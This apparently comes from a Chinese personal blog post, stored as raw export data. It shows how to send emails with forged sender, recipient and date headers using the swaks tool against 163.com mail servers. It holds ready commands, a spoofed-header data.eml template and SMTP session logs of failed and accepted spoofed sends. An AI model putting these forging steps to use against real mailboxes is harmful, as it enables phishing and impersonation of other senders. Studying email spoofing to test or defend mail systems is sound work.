1Uxr2xKj7kG0xkI17xGrU7I0s8FY2U3Uj8Cz28x1UUUUU7Ic2I0Y2Ur84UJgUCa0xDrUUUUj\n<-  250-STARTTLS\n<-  250-SIZE 73400320\n<-  250 8BITMIME\n -> MAIL FROM:<m19527700560@163.com>\n<** 553 Local user is not allowed,163 zwqz-mx-mta-g4-3,_____wCnFa7_NixkB9IdAA--.15197S2 1680619263\n -> QUIT\n<-  221 Bye\n=== Connection closed with remote host.\n```\n\n发生了553的错误。\n\n单纯地使用命令的行的方式，总是会出现一些奇奇怪怪的错误，至今还没研究明白是怎么一回事。应该是可以使用的，等待后续更新吧。\n\n---\n\n更加复杂的功能可以通过指定数据实现，也是我唯一执行成功的方法。\n\n```bash\nswaks --to river_li@whu.edu.cn --data data.eml\n```\n\n指定的data内容就是一封邮件的内容，可以指定From、Subject、Content-Type、DKIM-Signature等字段。\n可以把下面这一段代码，写进一个文件，命名为data.eml 在执行命令时进行引用。然后文件里的--to选项和--from选项即使相同也并不发生冲突，命令里的--to选项正常写。\n\n```bash 折叠代码\nDelivered-To: yixianosaurusphangnga7096@gmail.com\nReceived: by 2002:a4f:f31a:0:0:0:0:0 with SMTP id c26csp2268818ivo;\n        Mon, 30 Mar 2020 00:33:01 -0700 (PDT)\nX-Google-Smtp-Source: APiQypJvIKWdfG+6JpupjdqrYQfiXBeg7CPCrQ/ME+6eM+jUzhd19nOOsyGO1oi2FzXc892BL1EW\nX-Received: by 2002:a63:6d0b:: with SMTP id i11mr2776601pgc.404.1585553581825;\n        Mon, 30 Mar 2020 00:33:01 -0700 (PDT)\nARC-Seal: i=1; a=rsa-sha256; t=1585553581; cv=none;\n        d=google.com; s=arc-20160816;\n        b=YbBzqga5isSYWhaqAsRdWg/lzDH0S92InVplzXxAmGXkCqxdt7C3t9mOFLwZpEkpqi\n         QW4Y2I4+vAIpbiMi2MqUyLL7tU2Cq/jNlaO6VX+r0Gu1nx8ZxTpUR\n         b9yqaZaq6tcg48EWzGfuOT3uBs2aVp9W8Upf0MeSxPLVbpgEnzqMRjqlIhZaXAIe9kR1xg4V4IObPilZfBb4uYY0ayLTDcDDMXTc\n         GyjA==\nARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20160816;\n        h=subject:from:to:date:message-id;\n        bh=ecGWgWCJeWxJFeM0urOVWP+KOlqqvsQYKOpYUP8nk7I=;\n        b=ZHdmyDNpyMR/DCfW1heAmecEtINi+fb5Myr8+sjj1meh6oH0VhTZzvOCTylrp/WXlu\n         kGgDW2zzC95QeKAFF3ZbXClFoDVgEGECg2mTmQ2QUXB74qi5EDtu+X4izzxqjBZ+\n         m97oeNIBQoka40rvItwK8foHNSo3l6k55cpTvJ6+c1SvOz/eW5f0Im7dFpX3ELrioNMK\n         Kuvw==\nARC-Authentication-Results: i=1; mx.google.com;\n       spf=temperror (google.com: error in processing during lookup of admin@saucer-man.com: DNS error) smtp.mailfrom=admin@saucer-man.com\nReturn-Path: <admin@saucer-man.com>\nReceived: from saucer-man.com ([003.11.50.2])\n        by mx.google.com with ESMTP id m6si9771129pld.54.2020.03.30.00.33.01\n        for <yixianosaurusphaaaga7096@gmail.com>;\n        Mon, 30 Mar 2020 00:33:01 -0700 (PDT)\nReceived-SPF: temperror (google.com: error in processing during lookup of admin@saucer-man.com: DNS error) client-ip=003.11.50.2;\nAuthentication-Results: mx.google.com;\n       spf=temperror (google.com: error in processing during lookup of admin@saucer-man.com: DNS error) smtp.mailfrom=admin@saucer-man.com\nMessage-ID: <5e81a0ad.1c69fb81.18eb2.4993SMTPIN_ADDED_MISSING@mx.google.com>\nDate: Mon, 30 Mar 2020 15:32:58 +0800\nTo: yixianosaurusphaaaga7096@gmail.com\nFrom: admin@saucer-man.com\nSubject: test mail\nX-Mailer: saucer-man.com\n\n这里是信件的正文内容，可以进行修改。\n```    \n\n## PS：\n\n***Date: Mon, 30 Mar 2020 15:32:58 +0800***\n\n***To: yixianosaurusphaaaga7096@gmail.com***\n\n***From: admin@saucer-man.com***\n\n***Subject: test mail***\n\n> Date —可以修改邮件的时间戳\n\n> To —可以修改邮件的收件人\n\n> From —修改邮件的发件人\n\n> Subject —修改邮件的主题\n\n一般修改这几项就OK了\n\n---\n\n### 成功的案例\n\n```bash 折叠代码\nswaks --to worktestnet321@163.com --data /data.eml \n```\n\n我把文件写在了根目录下data.eml文件中，命令里的--to 是我要发送的邮件地址。\n\n```bash\n*** DEPRECATION WARNING: Inferring a filename from the argument to --data will be removed in the future.  Prefix filenames with '@' instead.\n=== Trying 163mx03.mxmail.netease.com:25...\n=== Connected to 163mx03.mxmail.netease.com.\n<-  220 163.com Anti-spam GT for Coremail System (163com[20141201])\n -> EHLO knight\n<-  250-mail\n<-  250-PIPELINING\n<-  250-AUTH LOGIN PLAIN\n<-  250-AUTH=LOGIN PLAIN\n<-  250-coremail 1Uxr2xKj7kG0xkI17xGrU7I0s8FY2U3Uj8Cz28x1UUUUU7Ic2I0Y2UFod1muUCa0xDrUUUUj\n<-  250-STARTTLS\n<-  250-SIZE 73400320\n<-  250 8BITMIME\n -> MAIL FROM:<knight@knight>\n<-  250 Mail OK\n -> RCPT TO:<m19527700560@163.com>\n<-  250 Mail OK\n -> DATA\n<-  354 End data with <CR><LF>.<CR><LF>\n -> Delivered-To: yixianosaurusphangnga7096@gmail.com\n -> Received: by 2002:a4f:f31a:0:0:0:0:0 with SMTP id c26csp2268818ivo;\n ->         Mon, 30 Mar 2020 00:33:01 -0700 (PDT)\n -> X-Google-Smtp-Source: APiQypJvIKWdfG+6JpupjdqrYQfiXBeg7CPCrQ/ME+6eM+jUzhd19nOOsyGO1oi2FzXc892BL1EW\n -> X-Received: by 2002:a63:6d0b:: with SMTP id i11mr2776601pgc.404.1585553581825;\n ->         Mon, 30 Mar 2020 00:33:01 -0700 (PDT)\n -> ARC-Seal: i=1; a=rsa-sha256; t=1585553581; cv=none;\n ->         d=google.com; s=arc-20160816;\n ->         b=YbBzqga5isSYWhaqAsRdWg/lzDH0S92InVplzXxAmGXkCqxdt7C3t9mOFLwZpEkpqi\n ->          QW4Y2I4+vAIpbiMi2MqUyLL7tU2Cq/jNlaO6VX+r0Gu1nx8ZxTpUR\n ->          b9yqaZaq6tcg48EWzGfuOT3uBs2aVp9W8Upf0MeSxPLVbpgEnzqMRjqlIhZaXAIe9kR1xg4V4IObPilZfBb4uYY0ayLTDcDDMXTc\n ->          GyjA==\n -> ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20160816;\n ->         h=subject:from:to:date:message-id;\n ->         bh=ecGWgWCJeWxJFeM0urOVWP+KOlqqvsQYKOpYUP8nk7I=;\n ->         b=ZHdmyDNpyMR/DCfW1heAmecEtINi+fb5Myr8+sjj1meh6oH0VhTZzvOCTylrp/WXlu\n ->          kGgDW2zzC95QeKAFF3ZbXClFoDVgEGECg2mTmQ2QUXB74qi5EDtu+X4izzxqjBZ+\n ->          m97oeNIBQoka40rvItwK8foHNSo3l6k55cpTvJ6+c1SvOz/eW5f0Im7dFpX3ELrioNMK\n ->          Kuvw==\n -> ARC-Authentication-Results: i=1; mx.google.com;\n ->        spf=temperror (google.com: error in processing during lookup of admin@saucer-man.com: DNS error) smtp.mailfrom=admin@saucer-man.com\n -> Return-Path: <admin@saucer-man.com>\n -> Received: from saucer-man.com ([003.11.50.2])\n ->         by mx.google.com with ESMTP id m6si9771129pld.54.2020.03.30.00.33.01\n ->         for <yixianosaurusphaaaga7096@gmail.com>;\n ->         Mon, 30 Mar 2020 00:33:01 -0700 (PDT)\n -> Received-SPF: temperror (google.com: error in processing during lookup of admin@saucer-man.com: DNS error) client-ip=003.11.50.2;\n -> Authentication-Results: mx.google.com;\n ->        spf=temperror (google.com: error in processing during lookup of admin@saucer-man.com: DNS error) smtp.mailfrom=admin@saucer-man.com\n -> Message-ID: <5e81a0ad.1c69fb81.18eb2.4993SMTPIN_ADDED_MISSING@mx.google.com>\n -> Date: Mon, 30 Mar 2020 15:32:58 +0800\n -> To: worktestnet321@163.com\n -> From: worktestnet321@163.com\n -> Subject: test mail\n -> X-Mailer: saucer-man.com\n -> \n -> 4008208820 DNC 橡果国际 新购物 新生活\n -> \n -> .\n<-  250 Mail OK queued as zwqz-mx-mta-g9-1,_____wBHQvQpOyxkxthYAA--.22943S2 1680620329\n -> QUIT\n<-  221 Bye\n=== Connection closed with remote host.\n```\n\n出现250的状态码发送成功，","slug":"post-fake-mail","published":1,"updated":"2024-05-03T03:55:54.885Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5gf007y7zj3a79h66yd","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>网络的安全是360度向外发射的，邮件的方向也是可以被利用的漏洞。今天新学的一个技能，可以自己给自己发邮件，目前只在163邮箱进行了实验，先把今天的小成果记录下来，后续有发现再做更新。</p>\n<p>如果有kali直接利用kali就OK，有一个工具叫swaks.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">swaks --to river_li@whu.edu.cn</span><br></pre></td></tr></table></figure>\n\n<p>这里只指定了收件人，目的是测试发送的连通性，可以当成一个测试。</p>\n<span id=\"more\"></span>\n\n<p>swaks 有常用的几个选项   </p>\n<ul>\n<li>–to</li>\n<li>–from</li>\n<li>–h-To</li>\n<li>–h-From</li>\n</ul>\n<p>直接在命令行中指定的–from实际上是SMTP协议中的MailFrom字段，即信封上的From</p>\n<p>使用–h-From指定的内容是信件内容中头部的From字段，即信件内容上，收件人看到的From</p>\n<p>–to和–h-To同理</p>\n<ul>\n<li>–server —要登录的服务器</li>\n<li>–ehlo   —要验证hello的服务器</li>\n<li>-au    —在这个服务器上的用户名</li>\n<li>-ap    —对应的用户密码</li>\n</ul>\n<p>swaks还可以登录登录其他的邮箱来发送邮件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">swaks --server smtp.163.com --au lizic0228@163.com --ap XXXXXXXXX --ehlo smtp.163.com --from lizic0228@163.com --to river_li@whu.edu.cn</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">swaks --to m19527705687@163.com --from m19527705687@163.com --body <span class=\"string\">&#x27;This is a test mailing&#x27;</span> --header <span class=\"string\">&#x27;Subject: test&#x27;</span> --ehlo gmail.com --header-X-Mailer gmail.com</span><br></pre></td></tr></table></figure>\n\n<p>这个命令的to和from都是一样的参数，很明显是执行不成功的。</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">=== Trying 163mx01.mxmail.netease.com:25...</span><br><span class=\"line\">=== Connected to 163mx01.mxmail.netease.com.</span><br><span class=\"line\">&lt;-  220 163.com Anti-spam GT <span class=\"keyword\">for</span> Coremail System (163com[20141201])</span><br><span class=\"line\"> -&gt; EHLO gmail.com</span><br><span class=\"line\">&lt;-  250-mail</span><br><span class=\"line\">&lt;-  250-PIPELINING</span><br><span class=\"line\">&lt;-  250-AUTH LOGIN PLAIN</span><br><span class=\"line\">&lt;-  250-AUTH=LOGIN PLAIN</span><br><span class=\"line\">&lt;-  250-coremail 1Uxr2xKj7kG0xkI17xGrU7I0s8FY2U3Uj8Cz28x1UUUUU7Ic2I0Y2Ur84UJgUCa0xDrUUUUj</span><br><span class=\"line\">&lt;-  250-STARTTLS</span><br><span class=\"line\">&lt;-  250-SIZE 73400320</span><br><span class=\"line\">&lt;-  250 8BITMIME</span><br><span class=\"line\"> -&gt; MAIL FROM:&lt;m19527700560@163.com&gt;</span><br><span class=\"line\">&lt;** 553 Local user is not allowed,163 zwqz-mx-mta-g4-3,_____wCnFa7_NixkB9IdAA--.15197S2 1680619263</span><br><span class=\"line\"> -&gt; QUIT</span><br><span class=\"line\">&lt;-  221 Bye</span><br><span class=\"line\">=== Connection closed with remote host.</span><br></pre></td></tr></table></figure>\n\n<p>发生了553的错误。</p>\n<p>单纯地使用命令的行的方式，总是会出现一些奇奇怪怪的错误，至今还没研究明白是怎么一回事。应该是可以使用的，等待后续更新吧。</p>\n<hr>\n<p>更加复杂的功能可以通过指定数据实现，也是我唯一执行成功的方法。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">swaks --to river_li@whu.edu.cn --data data.eml</span><br></pre></td></tr></table></figure>\n\n<p>指定的data内容就是一封邮件的内容，可以指定From、Subject、Content-Type、DKIM-Signature等字段。<br>可以把下面这一段代码，写进一个文件，命名为data.eml 在执行命令时进行引用。然后文件里的–to选项和–from选项即使相同也并不发生冲突，命令里的–to选项正常写。</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Delivered-To: yixianosaurusphangnga7096@gmail.com</span><br><span class=\"line\">Received: by 2002:a4f:f31a:0:0:0:0:0 with SMTP <span class=\"built_in\">id</span> c26csp2268818ivo;</span><br><span class=\"line\">        Mon, 30 Mar 2020 00:33:01 -0700 (PDT)</span><br><span class=\"line\">X-Google-Smtp-Source: APiQypJvIKWdfG+6JpupjdqrYQfiXBeg7CPCrQ/ME+6eM+jUzhd19nOOsyGO1oi2FzXc892BL1EW</span><br><span class=\"line\">X-Received: by 2002:a63:6d0b:: with SMTP <span class=\"built_in\">id</span> i11mr2776601pgc.404.1585553581825;</span><br><span class=\"line\">        Mon, 30 Mar 2020 00:33:01 -0700 (PDT)</span><br><span class=\"line\">ARC-Seal: i=1; a=rsa-sha256; t=1585553581; cv=none;</span><br><span class=\"line\">        d=google.com; s=arc-20160816;</span><br><span class=\"line\">        b=YbBzqga5isSYWhaqAsRdWg/lzDH0S92InVplzXxAmGXkCqxdt7C3t9mOFLwZpEkpqi</span><br><span class=\"line\">         QW4Y2I4+vAIpbiMi2MqUyLL7tU2Cq/jNlaO6VX+r0Gu1nx8ZxTpUR</span><br><span class=\"line\">         b9yqaZaq6tcg48EWzGfuOT3uBs2aVp9W8Upf0MeSxPLVbpgEnzqMRjqlIhZaXAIe9kR1xg4V4IObPilZfBb4uYY0ayLTDcDDMXTc</span><br><span class=\"line\">         GyjA==</span><br><span class=\"line\">ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20160816;</span><br><span class=\"line\">        h=subject:from:to:<span class=\"built_in\">date</span>:message-id;</span><br><span class=\"line\">        bh=ecGWgWCJeWxJFeM0urOVWP+KOlqqvsQYKOpYUP8nk7I=;</span><br><span class=\"line\">        b=ZHdmyDNpyMR/DCfW1heAmecEtINi+fb5Myr8+sjj1meh6oH0VhTZzvOCTylrp/WXlu</span><br><span class=\"line\">         kGgDW2zzC95QeKAFF3ZbXClFoDVgEGECg2mTmQ2QUXB74qi5EDtu+X4izzxqjBZ+</span><br><span class=\"line\">         m97oeNIBQoka40rvItwK8foHNSo3l6k55cpTvJ6+c1SvOz/eW5f0Im7dFpX3ELrioNMK</span><br><span class=\"line\">         Kuvw==</span><br><span class=\"line\">ARC-Authentication-Results: i=1; mx.google.com;</span><br><span class=\"line\">       spf=temperror (google.com: error <span class=\"keyword\">in</span> processing during lookup of admin@saucer-man.com: DNS error) smtp.mailfrom=admin@saucer-man.com</span><br><span class=\"line\">Return-Path: &lt;admin@saucer-man.com&gt;</span><br><span class=\"line\">Received: from saucer-man.com ([003.11.50.2])</span><br><span class=\"line\">        by mx.google.com with ESMTP <span class=\"built_in\">id</span> m6si9771129pld.54.2020.03.30.00.33.01</span><br><span class=\"line\">        <span class=\"keyword\">for</span> &lt;yixianosaurusphaaaga7096@gmail.com&gt;;</span><br><span class=\"line\">        Mon, 30 Mar 2020 00:33:01 -0700 (PDT)</span><br><span class=\"line\">Received-SPF: temperror (google.com: error <span class=\"keyword\">in</span> processing during lookup of admin@saucer-man.com: DNS error) client-ip=003.11.50.2;</span><br><span class=\"line\">Authentication-Results: mx.google.com;</span><br><span class=\"line\">       spf=temperror (google.com: error <span class=\"keyword\">in</span> processing during lookup of admin@saucer-man.com: DNS error) smtp.mailfrom=admin@saucer-man.com</span><br><span class=\"line\">Message-ID: &lt;5e81a0ad.1c69fb81.18eb2.4993SMTPIN_ADDED_MISSING@mx.google.com&gt;</span><br><span class=\"line\">Date: Mon, 30 Mar 2020 15:32:58 +0800</span><br><span class=\"line\">To: yixianosaurusphaaaga7096@gmail.com</span><br><span class=\"line\">From: admin@saucer-man.com</span><br><span class=\"line\">Subject: <span class=\"built_in\">test</span> mail</span><br><span class=\"line\">X-Mailer: saucer-man.com</span><br><span class=\"line\"></span><br><span class=\"line\">这里是信件的正文内容，可以进行修改。</span><br><span class=\"line\">```    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">## PS：</span></span><br><span class=\"line\"></span><br><span class=\"line\">***Date: Mon, 30 Mar 2020 15:32:58 +0800***</span><br><span class=\"line\"></span><br><span class=\"line\">***To: yixianosaurusphaaaga7096@gmail.com***</span><br><span class=\"line\"></span><br><span class=\"line\">***From: admin@saucer-man.com***</span><br><span class=\"line\"></span><br><span class=\"line\">***Subject: <span class=\"built_in\">test</span> mail***</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; Date —可以修改邮件的时间戳</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; To —可以修改邮件的收件人</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; From —修改邮件的发件人</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; Subject —修改邮件的主题</span><br><span class=\"line\"></span><br><span class=\"line\">一般修改这几项就OK了</span><br><span class=\"line\"></span><br><span class=\"line\">---</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">### 成功的案例</span></span><br><span class=\"line\"></span><br><span class=\"line\">```bash 折叠代码</span><br><span class=\"line\">swaks --to worktestnet321@163.com --data /data.eml </span><br></pre></td></tr></table></figure>\n\n<p>我把文件写在了根目录下data.eml文件中，命令里的–to 是我要发送的邮件地址。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*** DEPRECATION WARNING: Inferring a filename from the argument to --data will be removed <span class=\"keyword\">in</span> the future.  Prefix filenames with <span class=\"string\">&#x27;@&#x27;</span> instead.</span><br><span class=\"line\">=== Trying 163mx03.mxmail.netease.com:25...</span><br><span class=\"line\">=== Connected to 163mx03.mxmail.netease.com.</span><br><span class=\"line\">&lt;-  220 163.com Anti-spam GT <span class=\"keyword\">for</span> Coremail System (163com[20141201])</span><br><span class=\"line\"> -&gt; EHLO knight</span><br><span class=\"line\">&lt;-  250-mail</span><br><span class=\"line\">&lt;-  250-PIPELINING</span><br><span class=\"line\">&lt;-  250-AUTH LOGIN PLAIN</span><br><span class=\"line\">&lt;-  250-AUTH=LOGIN PLAIN</span><br><span class=\"line\">&lt;-  250-coremail 1Uxr2xKj7kG0xkI17xGrU7I0s8FY2U3Uj8Cz28x1UUUUU7Ic2I0Y2UFod1muUCa0xDrUUUUj</span><br><span class=\"line\">&lt;-  250-STARTTLS</span><br><span class=\"line\">&lt;-  250-SIZE 73400320</span><br><span class=\"line\">&lt;-  250 8BITMIME</span><br><span class=\"line\"> -&gt; MAIL FROM:&lt;knight@knight&gt;</span><br><span class=\"line\">&lt;-  250 Mail OK</span><br><span class=\"line\"> -&gt; RCPT TO:&lt;m19527700560@163.com&gt;</span><br><span class=\"line\">&lt;-  250 Mail OK</span><br><span class=\"line\"> -&gt; DATA</span><br><span class=\"line\">&lt;-  354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</span><br><span class=\"line\"> -&gt; Delivered-To: yixianosaurusphangnga7096@gmail.com</span><br><span class=\"line\"> -&gt; Received: by 2002:a4f:f31a:0:0:0:0:0 with SMTP <span class=\"built_in\">id</span> c26csp2268818ivo;</span><br><span class=\"line\"> -&gt;         Mon, 30 Mar 2020 00:33:01 -0700 (PDT)</span><br><span class=\"line\"> -&gt; X-Google-Smtp-Source: APiQypJvIKWdfG+6JpupjdqrYQfiXBeg7CPCrQ/ME+6eM+jUzhd19nOOsyGO1oi2FzXc892BL1EW</span><br><span class=\"line\"> -&gt; X-Received: by 2002:a63:6d0b:: with SMTP <span class=\"built_in\">id</span> i11mr2776601pgc.404.1585553581825;</span><br><span class=\"line\"> -&gt;         Mon, 30 Mar 2020 00:33:01 -0700 (PDT)</span><br><span class=\"line\"> -&gt; ARC-Seal: i=1; a=rsa-sha256; t=1585553581; cv=none;</span><br><span class=\"line\"> -&gt;         d=google.com; s=arc-20160816;</span><br><span class=\"line\"> -&gt;         b=YbBzqga5isSYWhaqAsRdWg/lzDH0S92InVplzXxAmGXkCqxdt7C3t9mOFLwZpEkpqi</span><br><span class=\"line\"> -&gt;          QW4Y2I4+vAIpbiMi2MqUyLL7tU2Cq/jNlaO6VX+r0Gu1nx8ZxTpUR</span><br><span class=\"line\"> -&gt;          b9yqaZaq6tcg48EWzGfuOT3uBs2aVp9W8Upf0MeSxPLVbpgEnzqMRjqlIhZaXAIe9kR1xg4V4IObPilZfBb4uYY0ayLTDcDDMXTc</span><br><span class=\"line\"> -&gt;          GyjA==</span><br><span class=\"line\"> -&gt; ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20160816;</span><br><span class=\"line\"> -&gt;         h=subject:from:to:<span class=\"built_in\">date</span>:message-id;</span><br><span class=\"line\"> -&gt;         bh=ecGWgWCJeWxJFeM0urOVWP+KOlqqvsQYKOpYUP8nk7I=;</span><br><span class=\"line\"> -&gt;         b=ZHdmyDNpyMR/DCfW1heAmecEtINi+fb5Myr8+sjj1meh6oH0VhTZzvOCTylrp/WXlu</span><br><span class=\"line\"> -&gt;          kGgDW2zzC95QeKAFF3ZbXClFoDVgEGECg2mTmQ2QUXB74qi5EDtu+X4izzxqjBZ+</span><br><span class=\"line\"> -&gt;          m97oeNIBQoka40rvItwK8foHNSo3l6k55cpTvJ6+c1SvOz/eW5f0Im7dFpX3ELrioNMK</span><br><span class=\"line\"> -&gt;          Kuvw==</span><br><span class=\"line\"> -&gt; ARC-Authentication-Results: i=1; mx.google.com;</span><br><span class=\"line\"> -&gt;        spf=temperror (google.com: error <span class=\"keyword\">in</span> processing during lookup of admin@saucer-man.com: DNS error) smtp.mailfrom=admin@saucer-man.com</span><br><span class=\"line\"> -&gt; Return-Path: &lt;admin@saucer-man.com&gt;</span><br><span class=\"line\"> -&gt; Received: from saucer-man.com ([003.11.50.2])</span><br><span class=\"line\"> -&gt;         by mx.google.com with ESMTP <span class=\"built_in\">id</span> m6si9771129pld.54.2020.03.30.00.33.01</span><br><span class=\"line\"> -&gt;         <span class=\"keyword\">for</span> &lt;yixianosaurusphaaaga7096@gmail.com&gt;;</span><br><span class=\"line\"> -&gt;         Mon, 30 Mar 2020 00:33:01 -0700 (PDT)</span><br><span class=\"line\"> -&gt; Received-SPF: temperror (google.com: error <span class=\"keyword\">in</span> processing during lookup of admin@saucer-man.com: DNS error) client-ip=003.11.50.2;</span><br><span class=\"line\"> -&gt; Authentication-Results: mx.google.com;</span><br><span class=\"line\"> -&gt;        spf=temperror (google.com: error <span class=\"keyword\">in</span> processing during lookup of admin@saucer-man.com: DNS error) smtp.mailfrom=admin@saucer-man.com</span><br><span class=\"line\"> -&gt; Message-ID: &lt;5e81a0ad.1c69fb81.18eb2.4993SMTPIN_ADDED_MISSING@mx.google.com&gt;</span><br><span class=\"line\"> -&gt; Date: Mon, 30 Mar 2020 15:32:58 +0800</span><br><span class=\"line\"> -&gt; To: worktestnet321@163.com</span><br><span class=\"line\"> -&gt; From: worktestnet321@163.com</span><br><span class=\"line\"> -&gt; Subject: <span class=\"built_in\">test</span> mail</span><br><span class=\"line\"> -&gt; X-Mailer: saucer-man.com</span><br><span class=\"line\"> -&gt; </span><br><span class=\"line\"> -&gt; 4008208820 DNC 橡果国际 新购物 新生活</span><br><span class=\"line\"> -&gt; </span><br><span class=\"line\"> -&gt; .</span><br><span class=\"line\">&lt;-  250 Mail OK queued as zwqz-mx-mta-g9-1,_____wBHQvQpOyxkxthYAA--.22943S2 1680620329</span><br><span class=\"line\"> -&gt; QUIT</span><br><span class=\"line\">&lt;-  221 Bye</span><br><span class=\"line\">=== Connection closed with remote host.</span><br></pre></td></tr></table></figure>\n\n<p>出现250的状态码发送成功，</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    